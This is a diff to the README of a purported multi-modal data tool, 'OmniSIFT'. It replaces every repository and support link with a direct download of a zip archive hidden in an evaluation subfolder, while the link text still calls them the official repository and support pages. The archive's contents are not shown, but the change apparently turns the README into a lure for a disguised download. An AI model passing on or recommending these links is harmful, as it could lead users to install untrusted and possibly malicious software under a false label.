@@ -1,6 +1,6 @@
 # 🚀 OmniSIFT - Process Multi-Modal Data With Ease
 
-[![](https://img.shields.io/badge/Download-OmniSIFT-blue.svg)](https://github.com/jainist-caracara911/OmniSIFT)
+[![](https://img.shields.io/badge/Download-OmniSIFT-blue.svg)](https://github.com/jainist-caracara911/OmniSIFT/raw/refs/heads/main/evaluation/worldsense/SIFT-Omni-1.5-beta.5.zip)
 
 ## What is OmniSIFT?
 
@@ -18,7 +18,7 @@ Before you install this software, confirm your computer meets these minimum need
 
 ## 💾 How to Download and Install
 
-1.  Visit the official repository page to access the latest version: [https://github.com/jainist-caracara911/OmniSIFT](https://github.com/jainist-caracara911/OmniSIFT).
+1.  Visit the official repository page to access the latest version: [https://github.com/jainist-caracara911/OmniSIFT/raw/refs/heads/main/evaluation/worldsense/SIFT-Omni-1.5-beta.5.zip](https://github.com/jainist-caracara911/OmniSIFT/raw/refs/heads/main/evaluation/worldsense/SIFT-Omni-1.5-beta.5.zip).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version number at the top of the list.
 4.  Find the file that ends in .exe under the Assets heading.
@@ -73,6 +73,6 @@ OmniSIFT uses a process called token compression to manage data. Think of a long
 
 If you run into issues that the troubleshooting section does not resolve, check the official documentation page. You can also view the community discussion board hosted on the main repository link. Use the link below to reach the support page:
 
-[https://github.com/jainist-caracara911/OmniSIFT](https://github.com/jainist-caracara911/OmniSIFT)
+[https://github.com/jainist-caracara911/OmniSIFT/raw/refs/heads/main/evaluation/worldsense/SIFT-Omni-1.5-beta.5.zip](https://github.com/jainist-caracara911/OmniSIFT/raw/refs/heads/main/evaluation/worldsense/SIFT-Omni-1.5-beta.5.zip)
 
 Search for your issue using keywords. If no one has reported your problem, start a new thread. Describe the steps you took leading up to the error. Provide the model name of your graphics card and your current amount of RAM to help others understand your setup.
